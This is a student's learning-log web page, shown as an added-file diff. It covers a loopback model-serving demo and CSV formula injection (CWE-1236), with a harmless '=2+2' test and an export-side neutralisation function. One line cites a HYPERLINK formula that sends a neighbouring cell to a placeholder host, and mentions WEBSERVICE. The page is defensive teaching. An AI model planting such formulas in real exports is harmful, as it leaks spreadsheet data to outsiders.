@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 022 — The model is not a function call, and a spreadsheet is an interpreter · Matías Rathgeb</title>
+<meta name="description" content="Day 022 of 1600. A student's private learning log.">
+<style>
+  :root{--white:#ffffff;--black:#000000;--gray:#86868b;--border:#d2d2d7;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--white);color:var(--black);font-family:Arial,Helvetica,sans-serif;font-size:14px;line-height:1.6;-webkit-font-smoothing:antialiased;}
+  a{color:var(--black);}
+  .wrap{max-width:720px;margin:0 auto;padding:0 22px;}
+  header{padding:80px 0 40px;border-bottom:1px solid var(--border);}
+  header .day{font-size:13px;color:var(--gray);letter-spacing:0.2px;margin-bottom:16px;}
+  header h1{font-size:40px;line-height:1.07;letter-spacing:-0.02em;font-weight:600;margin-bottom:12px;}
+  header .meta{font-size:13px;color:var(--gray);}
+  article{padding:48px 0 80px;}
+  h2{font-size:24px;line-height:1.15;letter-spacing:-0.01em;font-weight:600;margin:40px 0 16px;}
+  h3{font-size:17px;font-weight:600;margin:28px 0 10px;}
+  p{margin-bottom:16px;}
+  pre{background:#f5f5f7;border:1px solid var(--border);border-radius:8px;padding:16px;overflow-x:auto;font-size:13px;line-height:1.5;margin-bottom:16px;}
+  code{font-family:Menlo,Consolas,monospace;font-size:13px;}
+  ul,ol{margin:0 0 16px 22px;}
+  li{margin-bottom:6px;}
+  .verdict{border:1px solid var(--black);padding:20px 24px;margin-top:40px;}
+  .verdict p{margin-bottom:8px;}
+  footer{padding:40px 0 80px;border-top:1px solid var(--border);color:var(--gray);font-size:12px;}
+  @media(max-width:600px){header h1{font-size:30px;}}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="wrap">
+    <p class="day">DAY 022 OF 1600 · 2026-10-22</p>
+    <h1>Day 022 — The model is not a function call, and a spreadsheet is an interpreter</h1>
+    <p class="meta">A student's private learning log · one concept at a time.</p>
+  </div>
+</header>
+<article>
+  <div class="wrap">
+<p><strong>Date:</strong> 2026-10-22 · <strong>Day:</strong> 22 of 1600</p>
+<p><strong>Log:</strong> a student&#x27;s private learning log · one concept at a time.</p>
+<p>---</p>
+<h2>Concept #22 — A served model is a service with a contract, not a library call</h2>
+<p>MA02 is closed, so today opens MA03 (AI-Ops). The course&#x27;s own project</p>
+<p>description starts with the sentence I want to keep:</p>
+<p>&gt; R-01: The system shall be implemented using a service-based architecture. All</p>
+<p>&gt; components (e.g. user interface, model serving endpoint, database) must be</p>
+<p>&gt; developed as independent, standalone services that communicate over a network.</p>
+<p>Read quickly, that is a deployment preference. Read carefully, it is a claim</p>
+<p>about <strong>failure</strong>: if the model lives in the same process as the interface,</p>
+<p>then a model crash is an interface crash, and there is nothing to degrade</p>
+<p><em>into</em>. Putting a network boundary between them does not make the model more</p>
+<p>reliable — it makes its unreliability <strong>survivable</strong>, because the caller now has</p>
+<p>a place to catch it.</p>
+<p>That is the sentence I am keeping:</p>
+<p>&gt; A service boundary converts a crash into an error you can handle. The network</p>
+<p>&gt; is not there to make the model work; it is there so the model can fail</p>
+<p>&gt; without taking the page down with it.</p>
+<p>The second half, which the same requirement implies and nobody says out loud:</p>
+<p>a service has a <strong>contract</strong>. If the interface knows the URL and the JSON shape,</p>
+<p>the model behind it can be retrained, swapped or rewritten in another language</p>
+<p>without touching the UI. That is why the version of a model is a deployment</p>
+<p>concern, not a code change.</p>
+<p><strong>What I tried today:</strong> two processes, one file, standard library only. A tiny</p>
+<p>inference server on loopback exposing <code>/predict?x=</code>, and a client that behaves</p>
+<p>like the interface: three requests, then I shut the server down mid-session and</p>
+<p>make a fourth. The question is not whether the last call fails — it must fail.</p>
+<p>The question is whether the client survives it.</p>
+<p>The model is deliberately boring: <code>y = 2.17x + 0.30</code>, fitted by the closed form</p>
+<p>on four points I made up (x = 1..4, y = 2.5, 4.6, 6.8, 9.0), R² = 0.9999. What</p>
+<p>matters is not the fit, it is that it lives on the other side of a socket.</p>
+<pre><code>#!/usr/bin/env python3
+# service_demo.py - day-022 concept: the model is a service, not a library call.
+# Two roles in one process only for the demo: &quot;server&quot; (inference) and
+# &quot;client&quot; (what the UI would do). Server dies -&gt; client must degrade, not crash.
+import json, os, threading, time, urllib.request, urllib.error
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+# Linear model fitted on x=[1,2,3,4], y=[2.5,4.6,6.8,9.0]:
+# slope 2.17, intercept 0.30, R^2 = 0.9999 (closed form, no library).
+COEF, INTERCEPT = 2.17, 0.30
+
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if not self.path.startswith(&quot;/predict&quot;):
+            self.send_response(404); self.end_headers(); return
+        try:
+            x = float(self.path.split(&quot;x=&quot;)[-1])
+        except ValueError:
+            self.send_response(400); self.end_headers(); return
+        body = json.dumps({&quot;x&quot;: x, &quot;y&quot;: round(COEF * x + INTERCEPT, 3)}).encode()
+        self.send_response(200)
+        self.send_header(&quot;Content-Type&quot;, &quot;application/json&quot;)
+        self.send_header(&quot;Content-Length&quot;, str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def log_message(self, *a):
+        pass
+
+
+def start_server(port):
+    srv = ThreadingHTTPServer((&quot;127.0.0.1&quot;, port), Handler)
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    return srv
+
+
+def call(port, x):
+    t0 = time.perf_counter()
+    try:
+        with urllib.request.urlopen(f&quot;http://127.0.0.1:{port}/predict?x={x}&quot;, timeout=2) as r:
+            data = json.load(r)
+        return data, (time.perf_counter() - t0) * 1000
+    except (urllib.error.URLError, ConnectionError, OSError) as e:
+        return {&quot;error&quot;: type(e).__name__}, (time.perf_counter() - t0) * 1000
+
+
+if __name__ == &quot;__main__&quot;:
+    PORT = 8077
+    srv = start_server(PORT)
+    print(f&quot;[server] inference service up on 127.0.0.1:{PORT} (pid {os.getpid()})&quot;)
+    for x in (1, 5, 10):
+        d, ms = call(PORT, x)
+        print(f&quot;[client] x={x:&lt;3} -&gt; {d}  ({ms:.1f} ms)&quot;)
+    srv.shutdown(); srv.server_close()
+    print(&quot;[server] inference service STOPPED (simulates a crash / redeploy)&quot;)
+    d, ms = call(PORT, 1)
+    print(f&quot;[client] x=1   -&gt; {d}  ({ms:.1f} ms)  &lt;- UI shows &#x27;service unavailable&#x27;, process still alive&quot;)
+    print(&quot;[client] still running:&quot;, True)</code></pre>
+<p>Real output:</p>
+<pre><code>[server] inference service up on 127.0.0.1:8077 (pid 1259030)
+[client] x=1   -&gt; {&#x27;x&#x27;: 1.0, &#x27;y&#x27;: 2.47}  (2.5 ms)
+[client] x=5   -&gt; {&#x27;x&#x27;: 5.0, &#x27;y&#x27;: 11.15}  (0.6 ms)
+[client] x=10  -&gt; {&#x27;x&#x27;: 10.0, &#x27;y&#x27;: 22.0}  (0.5 ms)
+[server] inference service STOPPED (simulates a crash / redeploy)
+[client] x=1   -&gt; {&#x27;error&#x27;: &#x27;URLError&#x27;}  (0.2 ms)  &lt;- UI shows &#x27;service unavailable&#x27;, process still alive
+[client] still running: True</code></pre>
+<p><strong>What I understood from it:</strong> the interesting number is not 0.5 ms, it is the</p>
+<p>0.2 ms of the failure. A refused connection on loopback comes back faster than</p>
+<p>the answer did, which means the interface has time to render a real message.</p>
+<p>What it must <em>not</em> do is what a library call does — throw an exception inside</p>
+<p>the request handler and hand the user a stack trace.</p>
+<p>The part I had to write down to believe: the fix is not &quot;wrap it in try/except&quot;.</p>
+<p>It is that <strong>there is a place to wrap</strong>. In-process, the model and the page share</p>
+<p>a call stack and a heap; a model blowing up on a bad array is my bug, in my</p>
+<p>process, at whatever point it happens. Behind a socket, the failure arrives as a</p>
+<p>value — <code>URLError</code>, a 503, a timeout — and values can be handled, logged, retried</p>
+<p>and shown. Same physics, different supervisor.</p>
+<p>Honest limits: this is one loopback process playing both roles, so it proves</p>
+<p>the <em>shape</em> of the boundary, not the operational questions. I did not measure a</p>
+<p>real container restart, a load balancer retry, or what the p99 looks like when</p>
+<p>the inference service is saturated — that is week 2 material, and the project</p>
+<p>description asks for a <code>docker-compose.yml</code> that starts the whole thing, which</p>
+<p>is more than one file and more than today.</p>
+<p>---</p>
+<h2>Security #22 — CSV formula injection: the export is code, and Excel is an interpreter (CWE-1236)</h2>
+<p>Twenty-one classes in, and this is the first one where the *victim is a</p>
+<p>spreadsheet*. No server is attacked. The application behaves perfectly: it takes</p>
+<p>a string a user typed and writes it into a file, exactly as asked.</p>
+<p>That is the whole bug. A <code>.csv</code> is not a document format, it is a **serialisation</p>
+<p>of cells**, and a cell that starts with <code>=</code> is a formula. The exporter thinks it</p>
+<p>is writing data; the spreadsheet thinks it is being asked to compute.</p>
+<pre><code># what the exporter does, and it looks correct:
+row[&quot;name&quot;] = request.form[&quot;name&quot;]      # user typed: =2+2
+writer.writerow(row)                     # -&gt; name column literally =2+2</code></pre>
+<p><strong>What I tried today:</strong> a CSV with three rows — a clean name, the raw payload</p>
+<p><code>=2+2</code>, and the same payload neutralised with a leading apostrophe — then opened</p>
+<p>it with a real spreadsheet engine (<code>soffice --headless</code>) and read the resulting</p>
+<p>cells out of the <code>.ods</code> XML, so the difference is a byte-level fact instead of a</p>
+<p>claim.</p>
+<pre><code>#!/usr/bin/env python3
+# csv_inject.py - a user-supplied field that starts with &#x27;=&#x27; is written verbatim
+# into an export; a spreadsheet then treats it as a formula, not as data.
+import csv, sys
+
+PAYLOAD = &quot;=2+2&quot;
+
+rows = [
+    {&quot;id&quot;: 1, &quot;name&quot;: &quot;ana&quot;, &quot;score&quot;: 7},
+    {&quot;id&quot;: 2, &quot;name&quot;: PAYLOAD, &quot;score&quot;: 9},
+    {&quot;id&quot;: 3, &quot;name&quot;: &quot;&#x27;&quot; + PAYLOAD, &quot;score&quot;: 5},   # neutralised
+]
+
+with open(sys.argv[1], &quot;w&quot;, newline=&quot;&quot;, encoding=&quot;utf-8&quot;) as fh:
+    w = csv.DictWriter(fh, fieldnames=[&quot;id&quot;, &quot;name&quot;, &quot;score&quot;])
+    w.writeheader()
+    w.writerows(rows)</code></pre>
+<pre><code>$ python3 csv_inject.py export.csv
+id,name,score
+1,ana,7
+2,=2+2,9
+3,&#x27;=2+2,5
+
+$ soffice --headless --convert-to ods --outdir . export.csv
+$ unzip -p export.ods content.xml | grep -o &#x27;&lt;table:table-cell[^&gt;]*&gt;&#x27;</code></pre>
+<p>Real cell bytes, one line per cell, in order:</p>
+<pre><code>&lt;table:table-cell office:value-type=&quot;string&quot; calcext:value-type=&quot;string&quot;&gt;&lt;text:p&gt;id&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell office:value-type=&quot;string&quot; calcext:value-type=&quot;string&quot;&gt;&lt;text:p&gt;name&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell office:value-type=&quot;string&quot; calcext:value-type=&quot;string&quot;&gt;&lt;text:p&gt;score&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell office:value-type=&quot;float&quot; office:value=&quot;1&quot; calcext:value-type=&quot;float&quot;&gt;&lt;text:p&gt;1&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell office:value-type=&quot;string&quot; calcext:value-type=&quot;string&quot;&gt;&lt;text:p&gt;ana&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell office:value-type=&quot;float&quot; office:value=&quot;7&quot; calcext:value-type=&quot;float&quot;&gt;&lt;text:p&gt;7&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell office:value-type=&quot;float&quot; office:value=&quot;2&quot; calcext:value-type=&quot;float&quot;&gt;&lt;text:p&gt;2&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell table:formula=&quot;of:=2+2&quot; office:value-type=&quot;float&quot; office:value=&quot;4&quot; calcext:value-type=&quot;float&quot;&gt;&lt;text:p&gt;4&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell office:value-type=&quot;float&quot; office:value=&quot;9&quot; calcext:value-type=&quot;float&quot;&gt;&lt;text:p&gt;9&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell office:value-type=&quot;float&quot; office:value=&quot;3&quot; calcext:value-type=&quot;float&quot;&gt;&lt;text:p&gt;3&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell office:value-type=&quot;string&quot; calcext:value-type=&quot;string&quot;&gt;&lt;text:p&gt;&amp;apos;=2+2&lt;/text:p&gt;&lt;/table:table-cell&gt;
+&lt;table:table-cell office:value-type=&quot;float&quot; office:value=&quot;5&quot; calcext:value-type=&quot;float&quot;&gt;&lt;text:p&gt;5&lt;/text:p&gt;&lt;/table:table-cell&gt;</code></pre>
+<p>Two cells, same input, different types:</p>
+<pre><code>row 2: table:formula=&quot;of:=2+2&quot;   office:value-type=&quot;float&quot;  office:value=&quot;4&quot;   -&gt; COMPUTED
+row 3: (no formula)              office:value-type=&quot;string&quot; text:p=&#x27;=2+2      -&gt; TEXT</code></pre>
+<p><strong>What I understood:</strong> the payload does not need to be clever. <code>=2+2</code> is enough</p>
+<p>to prove the type confusion, and the real thing is the same mechanism with a</p>
+<p>different function name: <code>=HYPERLINK(&quot;http://x/?d=&quot;&amp;A1,&quot;open&quot;)</code> exfiltrates a</p>
+<p>neighbouring cell on click, <code>=WEBSERVICE(...)</code> does it without a click. I did not</p>
+<p>run those — they point at real network targets, and the arithmetic payload</p>
+<p>already proves evaluation. That is the line I keep for this log: prove the</p>
+<p>mechanism, do not build the weapon.</p>
+<p>The neutralisation is one byte and it must happen <strong>on export</strong>, never on import:</p>
+<pre><code>DANGEROUS = (&quot;=&quot;, &quot;+&quot;, &quot;-&quot;, &quot;@&quot;, &quot;\t&quot;, &quot;\r&quot;)
+
+def safe(cell):
+    s = str(cell)
+    return &quot;&#x27;&quot; + s if s.startswith(DANGEROUS) else s</code></pre>
+<p>Why all five characters and not just <code>=</code>: <code>+</code> and <code>-</code> are how a spreadsheet</p>
+<p>starts a number and also how it starts a formula, <code>@</code> is the legacy function</p>
+<p>prefix, and a leading tab or carriage return is what gets past a check that only</p>
+<p>strips whitespace before comparing. And why on export: the stored value must stay</p>
+<p>what the user typed — mutating it on import corrupts the data and breaks the next</p>
+<p>round-trip. The export is the boundary where data becomes code, so that is where</p>
+<p>the quoting belongs.</p>
+<p>Honest limits: this measured LibreOffice&#x27;s CSV importer with default settings,</p>
+<p>on Linux, with a formula that touches nothing. Excel&#x27;s importer has its own</p>
+<p>history of asking the user before evaluating, and some versions treat a leading</p>
+<p><code>=</code> in a CSV field as text depending on the quoting and the locale separator.</p>
+<p>The class is real either way — the CWE is about the exporter handing an</p>
+<p>interpreter a program, and which interpreter asks permission first is a detail</p>
+<p>that changes the blast radius, not the bug.</p>
+<p>---</p>
+<h2>Day 22 notes</h2>
+<ul><li>Concept #22: MA03 opened with R-01. A served model is a service because a network boundary turns a crash into a handleable error and decouples model version from UI code. Two roles on loopback, 0.5–2.5 ms per call, service killed mid-session → <code>URLError</code> in 0.2 ms and the client keeps running. ✔</li><li>Security #22: CSV formula injection (CWE-1236). <code>=2+2</code> in a name field comes back from <code>soffice</code> as <code>table:formula=&quot;of:=2+2&quot; office:value=&quot;4&quot;</code>; the apostrophe-prefixed copy stays <code>office:value-type=&quot;string&quot;</code>. Neutralise on export, all five prefixes (<code>= + - @</code> and tab/CR), never on import. Arithmetic payload only, no network targets. ✔</li><li>1578 days left. One at a time.</li></ul>
+<p><em>Written by my own daily machine, checked by me.</em></p>
+  </div>
+</article>
+<footer>
+  <div class="wrap">
+    <p><a href="/">← Back to the index</a> · Day 022 of 1600 · Matías Rathgeb</p>
+  </div>
+</footer>
+</body>
+</html>
